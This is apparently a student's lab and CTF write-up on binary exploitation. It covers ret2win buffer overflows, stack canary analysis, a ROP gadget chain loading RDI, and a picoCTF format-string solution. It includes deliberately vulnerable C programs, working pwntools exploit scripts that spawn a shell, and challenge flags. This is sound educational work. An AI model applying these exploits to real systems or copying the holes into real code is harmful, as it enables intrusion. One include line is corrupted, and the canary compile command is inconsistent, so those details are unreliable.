### Phase 4: Binary Exploitation I
This repository documents my work for Phase 4 of the Cyber Security Researcher track. It covers stack buffer overflow vulnerabilities (CWE-121), return address offset calculation, binary mitigations (Stack Canaries), control flow hijacking (ret2win), argument passing via ROP gadgets, and Format String vulnerability analysis (CWE-134).

--------------------------------------------------------------------------------

#### Lab Exercises: Buffer Overflow & ret2win

##### Exercise 1: Base Control Flow Hijack (ret2win)
In this exercise, I analyzed a C program (`vuln.c`) containing an unbounded stack buffer overflow vulnerability to redirect execution to an uncalled `win()` function.

###### Vulnerability Analysis
The target function `vulnerable()` reads up to 256 bytes into a local stack buffer using `read(0, buffer, 256)`:
```c
void vulnerable(void) {
    char buffer[64];
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}
```
Because input length exceeds destination capacity, input past 64 bytes overflows into adjacent stack memory, allowing control over Saved RBP and the Return Address (RIP).

###### Offset Calculation
Using GDB and `pwndbg` pattern generation (`cyclic`), I determined the exact offset to the return address:
* **Buffer Size:** 64 bytes
* **Saved RBP:** 8 bytes
* **Total Offset to Return Address (RIP):** 72 bytes

* **Flag:** entrypoint{ret2win_success}

--------------------------------------------------------------------------------

##### Exercise 2: Buffer Resizing & Dynamic Offset
To verify how buffer size directly impacts stack layout and offset calculations, I updated `vuln.c` by expanding the local buffer to 128 bytes.

###### Source Code Modification
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    printf("Access granted. Flag: entrypoint{ret2win_success}\n");
    system("/bin/sh");
}

void vulnerable(void) {
    char buffer[128]; // Resized from 64 to 128 bytes
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

###### Offset Recalculation
* **New Buffer Size:** 128 bytes
* **Saved RBP:** 8 bytes
* **New Offset to Return Address:** 136 bytes

###### Exploit Script (`exploit.py`)
I automated payload generation using `pwntools`:
```python
from pwn import *

elf = context.binary = ELF("./vuln")

OFFSET = 136

payload = flat({OFFSET: elf.symbols["win"]})

io = process("./vuln")
io.recvuntil(b"Enter data:")
io.sendline(payload)
io.interactive()
```

###### Verification
Running `python3 exploit.py` successfully overwrote RIP at offset 136, executed `win()`, and spawned an interactive `/bin/sh` shell.

--------------------------------------------------------------------------------

##### Exercise 3: Mitigation Analysis – Stack Canary (`vuln_canary`)
In this exercise, I analyzed how compiler mitigations prevent buffer overflow exploitation by compiling `vuln.c` with Stack Canary protection enabled.

###### Compilation
```bash
gcc -g -O0 -no-pie -o vuln_canary vuln.c
```

###### Execution & Crash Analysis
Running the overflow payload against `./vuln_canary` resulted in immediate termination:
```text
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

###### Root Cause Analysis
1. **Canary Placement:** The compiler places a random 8-byte guard value (Canary) on the stack between local variables and Saved RBP (`[rbp-8]`).
2. **Corruption:** Overflowing the buffer to reach RIP inevitably corrupts the Canary value.
3. **Detection:** Upon exiting `vulnerable()`, the epilogue verifies the Canary against its reference value. Detection of a mismatch triggers `__stack_chk_fail()`, immediately halting execution and neutralizing the exploit.

--------------------------------------------------------------------------------

##### Exercise 4: Argument Passing via ROP Gadget (`vuln2` / `exploit2.py`)
In this exercise, the target function was updated to `win(int code)`, requiring a specific argument (`0x1337`) to be loaded into the `RDI` register prior to execution.

###### System V ABI & ROP Chain Concept
Under 64-bit Linux conventions, the first function argument is passed in `RDI`. Since memory pages are Non-Executable (NX), a Return-Oriented Programming (ROP) gadget (`pop rdi; ret`) was located to populate `RDI` from stack memory. Additionally, a single `ret` gadget was prepended to maintain 16-byte stack alignment for `system()`.

###### Source Code Modification (`vuln2.c`)
```c
#include <stdio.h>
#include <stdlib. me>
#include <unistd.h>

void __attribute__((naked)) gadget(void) {
    __asm__("pop %rdi; ret");
}

void win(int code) {
    if (code == 0x1337) {
        puts("[+] Access granted. Code matches 0x1337!");
        system("/bin/sh");
    } else {
        printf("[-] Wrong code: 0x%x\n", code);
    }
}

void vulnerable(void) {
    char buffer[128];
    puts("Enter data:");
    read(0, buffer, 256);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

###### Exploit Script (`exploit2.py`)
```python
from pwn import *

elf = context.binary = ELF("./vuln2")

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret_gadget = rop.find_gadget(["ret"]).address

OFFSET = 136

payload = flat({
    OFFSET: [
        ret_gadget,         # 16-byte stack alignment
        pop_rdi,            # Load 0x1337 into RDI
        0x1337,             # Argument value
        elf.symbols["win"]  # Target address
    ]
})

io = process("./vuln2")
io.recvuntil(b"Enter data:")
io.sendline(payload)
io.interactive()
```

###### Verification
Executing `python3 exploit2.py` populated `RDI` with `0x1337`, passed the conditional check in `win()`, and granted an interactive shell.

* **Flag:** entrypoint{rdi_gadget_success}

--------------------------------------------------------------------------------

#### CTF Challenge Solutions

##### 1. Format String 0 (picoGym)
* **Category:** Binary Exploitation / Format String
* **Source:** picoCTF / CyLab Academy

###### Vulnerability Analysis
The flaw exists because user input is passed directly into `printf(input)` as the format string itself, instead of being safely printed with `printf("%s", input)`. This allows any inserted format specifiers (like `%114d` or `%s`) to be processed by `printf`, enabling stack memory inspection, output inflation, and crashes.

###### Exploitation Workflow
1. **Stage 1 (Patrick's Order):** Selected `Gr%114d_Cheese`. The `%114d` specifier forces `printf` to pad the printed output to 114 characters with spaces, satisfying the minimum length check without crashing the program.
2. **Stage 2 (SpongeBob's Order):** Selected `Cla%sic_Che%s%steak`. The `%s` specifier tells `printf` to dereference a memory pointer from the stack. Since the pointer is invalid, it triggers an immediate Segmentation Fault (`SIGSEGV`).
3. **Flag Extraction:** The program's built-in crash handler (`sigsegv_handler`) catches the Segfault and prints the flag.

###### Key Differences: Format String vs. Buffer Overflow
* **Memory Access:** Buffer overflows overwrite memory sequentially by writing past buffer limits. Format strings use format specifiers to read or write specific stack locations directly without needing a huge payload.
* **Control Flow Hijack:** Buffer overflows overwrite frame pointers and return addresses (RIP). Format string bugs leak memory, overwrite pointers/GOT entries via `%n`, or intentionally trigger crash handlers.

* **Flag:** academy{7h3_cu570m3r_15_n3v3r_SEGFAULT_d2989a30}
